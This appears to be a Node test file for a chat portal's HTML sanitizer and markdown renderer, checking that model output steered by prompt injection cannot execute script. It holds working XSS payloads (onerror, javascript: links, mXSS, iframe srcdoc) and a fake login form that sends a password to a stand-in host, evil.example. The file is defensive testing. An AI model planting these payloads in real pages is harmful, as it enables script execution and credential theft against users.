// Hostile-input regression tests for the Portal's one HTML sanitizer
// (Portal/modules/sanitize.js) and the markdown renderer built on it.
// Audit: P01-chat-core-web-01/02/03, X04-security-clients-infra-06/07/08,
// X05-architecture-02, P07-html-css-04.
//
// Run: cd tests/web && npm ci && node --test
import test from "node:test";
import assert from "node:assert/strict";
import { installDom, loadPurify, loadMarked, unloadPurify, unloadMarked, mount, scriptVectors } from "./helpers/portal-dom.mjs";

installDom();
loadPurify();
loadMarked();

const { sanitizeAssistantHtml, isSanitizerAvailable, plainTextHtml, htmlToText } =
    await import("../../Portal/modules/sanitize.js");
const { renderMarkdown, markdownToSafeHtml, applySyntaxHighlighting } =
    await import("../../Portal/modules/markdown-renderer.js");

// Model output an attacker can steer (prompt-injected web_fetch / email / SMS).
const PAYLOADS = {
    imgOnerror: `<img src=x onerror="window.__pwned=1">`,
    svgOnload: `<svg onload="window.__pwned=1"><circle r="5"/></svg>`,
    jsLink: `<a href="javascript:window.__pwned=1">click</a>`,
    jsLinkEntity: `<a href="jav&#x09;ascript:alert(1)">click</a>`,
    iframe: `<iframe src="https://evil.example/" srcdoc="<script>parent.__pwned=1</script>"></iframe>`,
    script: `<script>window.__pwned=1</script>`,
    form: `<form action="https://evil.example/steal"><input name="pw"><button>Log in</button></form>`,
    style: `<style>body{display:none}</style>`,
    objectEmbed: `<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">`,
    detailsToggle: `<details open ontoggle="window.__pwned=1"><summary>x</summary></details>`,
    mathMxss: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
    videoPoster: `<video poster="javascript:alert(1)" onloadstart="alert(1)"><source src="x.mp4" onerror="alert(1)"></video>`,
};

// ── sanitizeAssistantHtml ────────────────────────────────────────────────
for (const [name, payload] of Object.entries(PAYLOADS)) {
    test(`sanitizeAssistantHtml neutralizes ${name}`, () => {
        const out = sanitizeAssistantHtml(payload);
        assert.deepEqual(scriptVectors(mount(out)), [], out);
    });
}

test("sanitizeAssistantHtml keeps <audio controls src> and <video> with <source>", () => {
    const html = `<div class="media-preview media-audio"><audio controls preload="metadata" src="/ui/uploads/a.mp3"></audio></div>`
        + `<div class="media-preview media-video"><video controls preload="metadata" poster="/ui/uploads/p.png">`
        + `<source src="/ui/uploads/v.mp4" type="video/mp4"></video></div>`;
    const root = mount(sanitizeAssistantHtml(html));
    const audio = root.querySelector("audio");
    assert.ok(audio, "audio element survives");
    assert.equal(audio.getAttribute("src"), "/ui/uploads/a.mp3");
    assert.ok(audio.hasAttribute("controls"));
    assert.equal(audio.getAttribute("preload"), "metadata");
    const video = root.querySelector("video");
    assert.ok(video, "video element survives");
    assert.ok(video.hasAttribute("controls"));
    assert.equal(video.getAttribute("poster"), "/ui/uploads/p.png");
    const source = root.querySelector("video source");
    assert.ok(source, "source element survives");
    assert.equal(source.getAttribute("src"), "/ui/uploads/v.mp4");
    assert.equal(source.getAttribute("type"), "video/mp4");
    // Renderer classes the CSS relies on survive too.
    assert.ok(root.querySelector(".media-preview.media-audio"));
    assert.ok(root.querySelector(".media-preview.media-video"));
});

test("sanitizeAssistantHtml keeps the renderer's classes, data-highlight spans and download links", () => {
    const html = `<pre><code class="hljs language-js">x</code></pre>`
        + `<span data-highlight="snapshot" class="clickable-snapshot" data-snap-id="SNAP-1">SNAP-1</span>`
        + `<a href="/ui/uploads/i.png" download="i.png" class="media-download-btn">Download</a>`
        + `<img src="/ui/uploads/i.png" alt="i" loading="lazy" class="generated-image">`;
    const root = mount(sanitizeAssistantHtml(html));
    assert.ok(root.querySelector("code.hljs.language-js"));
    assert.equal(root.querySelector("[data-highlight]").getAttribute("data-snap-id"), "SNAP-1");
    assert.equal(root.querySelector("a.media-download-btn").getAttribute("download"), "i.png");
    assert.equal(root.querySelector("img.generated-image").getAttribute("loading"), "lazy");
});

test("sanitizeAssistantHtml FAILS CLOSED without DOMPurify: escaped text, never markup", () => {
    unloadPurify();
    try {
        assert.equal(isSanitizerAvailable(), false);
        const out = sanitizeAssistantHtml(PAYLOADS.imgOnerror);
        const root = mount(out);
        assert.equal(root.querySelector("img"), null, out);
        assert.equal(root.textContent, PAYLOADS.imgOnerror);
    } finally {
        loadPurify();
    }
});

test("sanitizeAssistantHtml FAILS CLOSED when DOMPurify throws", () => {
    const real = globalThis.DOMPurify;
    globalThis.DOMPurify = { isSupported: true, sanitize() { throw new Error("boom"); } };
    try {
        const root = mount(sanitizeAssistantHtml(PAYLOADS.svgOnload));
        assert.equal(root.querySelector("svg"), null);
        assert.equal(root.textContent, PAYLOADS.svgOnload);
    } finally {
        globalThis.DOMPurify = real;
    }
});

test("sanitizeAssistantHtml FAILS CLOSED when DOMPurify reports isSupported=false", () => {
    const real = globalThis.DOMPurify;
    globalThis.DOMPurify = { isSupported: false, sanitize: (s) => s };
    try {
        assert.equal(mount(sanitizeAssistantHtml(PAYLOADS.imgOnerror)).querySelector("img"), null);
    } finally {
        globalThis.DOMPurify = real;
    }
});

test("plainTextHtml escapes everything and keeps line breaks", () => {
    const root = mount(plainTextHtml(`a <b>\n"c" & 'd'`));
    assert.equal(root.querySelector("b"), null);
    assert.equal(root.querySelectorAll("br").length, 1);
    assert.equal(root.textContent, `a <b>"c" & 'd'`);
});

test("htmlToText parses in an inert document (no live-document innerHTML)", () => {
    const desc = Object.getOwnPropertyDescriptor(window.Element.prototype, "innerHTML");
    const liveWrites = [];
    Object.defineProperty(window.Element.prototype, "innerHTML", {
        configurable: true,
        get: desc.get,
        set(v) {
            if (this.ownerDocument === window.document) liveWrites.push(String(v));
            return desc.set.call(this, v);
        },
    });
    try {
        const text = htmlToText(`Hello <img src=x onerror="window.__pwned=1"> <b>world</b>`);
        assert.equal(text, "Hello  world");
        assert.deepEqual(liveWrites, []);
    } finally {
        Object.defineProperty(window.Element.prototype, "innerHTML", desc);
    }
});

// ── renderMarkdown / markdownToSafeHtml ──────────────────────────────────
for (const [name, payload] of Object.entries(PAYLOADS)) {
    test(`renderMarkdown neutralizes raw HTML in model output: ${name}`, () => {
        const out = renderMarkdown(`Here you go:\n\n${payload}\n\n**done**`);
        assert.deepEqual(scriptVectors(mount(out)), [], out);
    });
}

test("renderMarkdown neutralizes a markdown javascript: link", () => {
    const root = mount(renderMarkdown("[click me](javascript:window.__pwned=1)"));
    assert.deepEqual(scriptVectors(root), []);
});

test("renderMarkdown still renders markdown and media URLs (no regression)", () => {
    const root = mount(renderMarkdown("**bold** and `code`\n\n/ui/uploads/song.mp3\n\n/ui/uploads/clip.mp4"));
    assert.ok(root.querySelector("strong"));
    assert.ok(root.querySelector("code"));
    const audio = root.querySelector("audio[controls]");
    assert.ok(audio, root.innerHTML);
    assert.equal(audio.querySelector("source").getAttribute("src"), "/ui/uploads/song.mp3");
    assert.ok(root.querySelector("video[controls] source[src='/ui/uploads/clip.mp4']"));
});

test("renderMarkdown FAILS CLOSED without DOMPurify (escapes the source, not marked output)", () => {
    unloadPurify();
    try {
        const src = `**hi** ${PAYLOADS.imgOnerror}`;
        const root = mount(renderMarkdown(src));
        assert.equal(root.querySelector("img"), null);
        assert.equal(root.textContent, src);
    } finally {
        loadPurify();
    }
});

test("renderMarkdown FAILS CLOSED without marked", () => {
    unloadMarked();
    try {
        const root = mount(renderMarkdown(PAYLOADS.imgOnerror));
        assert.equal(root.querySelector("img"), null);
        assert.equal(root.textContent, PAYLOADS.imgOnerror);
    } finally {
        loadMarked();
    }
});

test("renderMarkdown FAILS CLOSED when marked throws", () => {
    const real = globalThis.marked;
    globalThis.marked = { parse() { throw new Error("boom"); } };
    try {
        const root = mount(renderMarkdown(PAYLOADS.imgOnerror));
        assert.equal(root.querySelector("img"), null);
    } finally {
        globalThis.marked = real;
    }
});

test("markdownToSafeHtml (agent renderers) sanitizes and fails closed", () => {
    assert.deepEqual(scriptVectors(mount(markdownToSafeHtml(`# t\n${PAYLOADS.imgOnerror}`))), []);
    unloadPurify();
    try {
        assert.equal(mount(markdownToSafeHtml(PAYLOADS.imgOnerror)).querySelector("img"), null);
    } finally {
        loadPurify();
    }
});

test("renderMarkdown tolerates null/undefined", () => {
    assert.equal(renderMarkdown(null), "");
    assert.equal(renderMarkdown(undefined), "");
});

// ── applySyntaxHighlighting must never turn text back into markup ────────
test("applySyntaxHighlighting does not re-inject escaped tags as elements", () => {
    // marked/DOMPurify correctly leave this as TEXT; the old highlighter read the
    // decoded textContent and assigned it to innerHTML, making it a live <img>.
    const root = mount(renderMarkdown("&lt;img src=x onerror='window.__pwned=1'&gt; context 1 (a) [b] \"q\" Label: x"));
    const before = root.textContent;
    assert.equal(root.querySelector("img"), null);
    applySyntaxHighlighting(root);
    assert.equal(root.querySelector("img"), null, root.innerHTML);
    assert.deepEqual(scriptVectors(root), []);
    assert.equal(root.textContent, before, "highlighting must not change the visible text");
    // ...and it still highlights.
    for (const kind of ["keyword", "number", "round-bracket", "square-bracket", "quote-mark", "quoted-text", "label"]) {
        assert.ok(root.querySelector(`[data-highlight="${kind}"]`), `${kind} span present: ${root.innerHTML}`);
    }
});

test("applySyntaxHighlighting: citations, numbered items, code blocks skipped, idempotent", () => {
    const root = mount(`<p>See [12] for details.</p><p>1. first</p><pre><code>if (a) { 42 }</code></pre>`);
    applySyntaxHighlighting(root);
    assert.equal(root.querySelector('[data-highlight="citation"]').textContent, "[12]");
    assert.equal(root.querySelector("pre").querySelectorAll("[data-highlight]").length, 0);
    const once = root.innerHTML;
    applySyntaxHighlighting(root);
    assert.equal(root.innerHTML, once, "second pass must not nest highlights");
});
